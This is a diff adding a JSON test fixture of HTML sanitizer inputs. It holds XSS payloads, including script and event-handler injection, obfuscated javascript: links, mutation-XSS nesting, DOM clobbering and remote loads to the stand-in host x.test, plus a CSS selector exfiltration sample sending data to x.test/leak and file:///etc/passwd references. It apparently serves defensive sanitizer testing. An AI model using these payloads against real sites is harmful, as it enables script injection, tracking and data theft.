@@ -1,0 +1,146 @@
+[
+	{
+		"name": "script",
+		"html": "<script>alert(1)</script><SCRIPT SRC=//x.test/x.js></SCRIPT><scr<script>ipt>alert(1)</script>"
+	},
+	{
+		"name": "event-handlers",
+		"html": "<img src=x onerror=alert(1)><div onmouseover=\"x()\">d</div><details open ontoggle=alert(1)>t</details><body onload=alert(1)><p ONCLICK=alert(1)>p</p>"
+	},
+	{
+		"name": "meta-base-link",
+		"html": "<meta http-equiv=refresh content=\"0;url=https://x.test\"><base href=\"https://x.test/\"><link rel=stylesheet href=https://x.test/a.css><link rel=prefetch href=https://x.test/p><link rel=import href=https://x.test/i>"
+	},
+	{
+		"name": "css-url-attr",
+		"html": "<div style=\"background:url(https://x.test/a)\">a</div><div style=\"background:u\\rl(https://x.test/b)\">b</div><div style=\"background:url(&quot;https://x.test/c&quot;)\">c</div><div style=\"background:url(&quot;https://x.test/d)&quot;)\">d</div>"
+	},
+	{
+		"name": "css-import",
+		"html": "<style>@import 'https://x.test/a.css';@import url(https://x.test/b.css);@\\69mport url(https://x.test/c.css);</style><p>x</p>"
+	},
+	{
+		"name": "css-exfiltration",
+		"html": "<style>input[value^=\"a\"]{background:url(https://x.test/leak?a)}a[href*=\"secret\"]{background-image:url('https://x.test/leak?s')}</style><a href=\"https://calloway.test/secret\">s</a>"
+	},
+	{
+		"name": "css-font-face",
+		"html": "<style>@font-face{font-family:x;src:url(https://x.test/f.woff)}@FONT-FACE{font-family:y;src:local(x),url(//x.test/g)}p{font-family:x}</style><p>f</p>"
+	},
+	{
+		"name": "css-image-set",
+		"html": "<div style=\"background-image:image-set('https://x.test/a.png' 1x, url(https://x.test/b.png) 2x)\">a</div><div style=\"background-image:-webkit-image-set(&quot;https://x.test/c.png&quot; 1x)\">b</div>"
+	},
+	{
+		"name": "css-other-urls",
+		"html": "<div style=\"cursor:url(https://x.test/c),auto;list-style:url(https://x.test/l);behavior:url(https://x.test/x.htc);-moz-binding:url(https://x.test/x.xml#x);mask:url(https://x.test/m.svg);filter:url(https://x.test/f.svg#f);content:url(https://x.test/c)\">x</div>"
+	},
+	{
+		"name": "css-bad-url",
+		"html": "<div style=\"background:url(https://x.test/a b)\">a</div><div style=\"background:url(https://x.test/a\">b</div><style>p{background:url(https://x.test/z</style><p>z</p>"
+	},
+	{
+		"name": "css-namespace-and-comments",
+		"html": "<style>@namespace url(https://x.test/ns);p{color:red/*}p{background:url(https://x.test/c)}*/}</style><style>/*</style><p>q</p>"
+	},
+	{
+		"name": "css-escapes",
+		"html": "<div style=\"background:\\75 \\72 \\6c (https://x.test/e)\">e</div><div style=\"background:URL(https://x.test/u)\">u</div>"
+	},
+	{
+		"name": "forms",
+		"html": "<form action=https://x.test><input type=submit formaction=https://x.test value=go><button formaction=javascript:alert(1)>b</button></form><isindex action=https://x.test>"
+	},
+	{
+		"name": "svg",
+		"html": "<svg><image href=https://x.test/a.png /><script>alert(1)</script><a xlink:href=\"javascript:alert(1)\"><text>x</text></a><use href=\"https://x.test/a.svg#x\"/><foreignObject><img src=x onerror=alert(1)></foreignObject></svg><svg/onload=alert(1)>"
+	},
+	{
+		"name": "math-mxss",
+		"html": "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>"
+	},
+	{
+		"name": "math-svg-mxss",
+		"html": "<math><mi><mglyph><svg><mtext><textarea><path id=\"</textarea><img onerror=alert(1) src=1>\"></textarea></mtext></svg></mglyph></mi></math>"
+	},
+	{
+		"name": "form-math-mxss",
+		"html": "<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>"
+	},
+	{
+		"name": "svg-style-mxss",
+		"html": "<svg></p><style><a id=\"</style><img src=1 onerror=alert(1)>\">"
+	},
+	{
+		"name": "links",
+		"html": "<a href=\"javascript:alert(1)\">1</a><a href=\"java&#x09;script:alert(1)\">2</a><a href=\"&#106;avascript:alert(1)\">3</a><a href=\"  javascript:alert(1)\">4</a><a href=\"vbscript:msgbox(1)\">5</a><a href=\"data:text/html,<script>alert(1)</script>\">6</a><a href=\"JaVaScRiPt:alert(1)\">7</a><a href=\"&#x01;javascript:alert(1)\">8</a><a href=\"javascript&colon;alert(1)\">9</a><a href=\"file:///etc/passwd\">10</a><area href=\"javascript:alert(1)\">"
+	},
+	{
+		"name": "remote-images",
+		"html": "<img src=https://x.test/a.png><img src=//x.test/b.png><img src=c.png><img src=\" https://x.test/d.png\"><img srcset=\"https://x.test/e.png 2x\"><image src=https://x.test/f.png><img lowsrc=https://x.test/g.png dynsrc=https://x.test/h.avi><img src=file:///etc/passwd><img src=\"data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><image href='https://x.test/i.png'/></svg>\">"
+	},
+	{
+		"name": "remote-media",
+		"html": "<video poster=https://x.test/p.jpg src=https://x.test/v.mp4><source src=https://x.test/v.webm><track src=https://x.test/t.vtt></video><audio src=https://x.test/a.mp3></audio><input type=image src=https://x.test/i.png><picture><source srcset=https://x.test/p.webp><img src=cid:logo></picture>"
+	},
+	{
+		"name": "embedding",
+		"html": "<iframe src=https://x.test></iframe><frameset><frame src=https://x.test></frameset><embed src=https://x.test/e.swf><object data=https://x.test/o.swf><param name=movie value=https://x.test/m.swf></object><applet code=x></applet><portal src=https://x.test></portal>"
+	},
+	{
+		"name": "backgrounds",
+		"html": "<table background=https://x.test/t.png><tr><td background=https://x.test/td.png>t</td></tr></table><body background=https://x.test/b.png>"
+	},
+	{
+		"name": "ping-and-base",
+		"html": "<a ping=https://x.test/ping href=https://calloway.test/>p</a><base target=_top href=https://x.test/>"
+	},
+	{
+		"name": "raw-text-mxss",
+		"html": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\"></noscript><style><img src=x onerror=alert(1)></style><title><img src=x onerror=alert(1)></title><xmp><img src=x onerror=alert(1)></xmp><iframe><img src=x onerror=alert(1)></iframe><noembed><img src=x onerror=alert(1)></noembed>"
+	},
+	{
+		"name": "plaintext",
+		"html": "<p>before</p><plaintext><img src=x onerror=alert(1)><script>alert(1)</script>"
+	},
+	{
+		"name": "comment-cdata-pi",
+		"html": "<!--<img src=x onerror=alert(1)>--><![CDATA[<img src=x onerror=alert(1)>]]><?xml <img src=x onerror=alert(1)>?><!--><img src=x onerror=alert(1)>-->"
+	},
+	{
+		"name": "attr-breakouts",
+		"html": "<a title=\"--><img src=x onerror=alert(1)>\">a</a><p id=\"</style><img src=x onerror=alert(1)>\">b</p><p title=\"]]><img src=x onerror=alert(1)>\">c</p><p class=\"</title><img src=x onerror=alert(1)>\">d</p>"
+	},
+	{
+		"name": "nested-raw-text",
+		"html": "<select><style><img src=x onerror=alert(1)></style></select><table><style><img src=x onerror=alert(1)></style></table><textarea></textarea><img src=x onerror=alert(1)>"
+	},
+	{
+		"name": "template",
+		"html": "<template><script>alert(1)</script><img src=x onerror=alert(1)><template><iframe src=https://x.test></iframe></template></template><template shadowrootmode=open><img src=x onerror=alert(1)></template>"
+	},
+	{
+		"name": "clobbering",
+		"html": "<img name=getElementById src=cid:logo><form><input name=attributes></form><a id=cookie href=#>c</a><p id=location>l</p><form><input id=nodeName><img name=childNodes></form>"
+	},
+	{
+		"name": "is-attribute",
+		"html": "<p is=\"x-evil\">p</p><button is=\"x-b\">b</button>"
+	},
+	{
+		"name": "unicode-tricks",
+		"html": "<a href=\"‮javascript:alert(1)\">rtl</a><a href=\"java\u0000script:alert(1)\">nul</a><a href=\"﻿javascript:alert(1)\">bom</a><img src=\" https://x.test/n.png\">"
+	},
+	{
+		"name": "srcdoc-and-misc",
+		"html": "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe><div data-x=\"javascript:alert(1)\" aria-label=\"javascript:x\">d</div><a href=\"https://calloway.test\" target=\"_top\" rel=\"opener\">t</a><object type=text/html data=data:text/html,x></object><img src=\"data:image/png;base64,iVBOR\" onload=alert(1)>"
+	},
+	{
+		"name": "custom-elements",
+		"html": "<x-frame src=https://x.test/a>x</x-frame><my-img src=https://x.test/b></my-img><o:p src=https://x.test/c>o</o:p>"
+	},
+	{
+		"name": "attributename",
+		"html": "<p attributename=\"href\">a</p><a attributeName=\"xhref\">b</a>"
+	}
+]
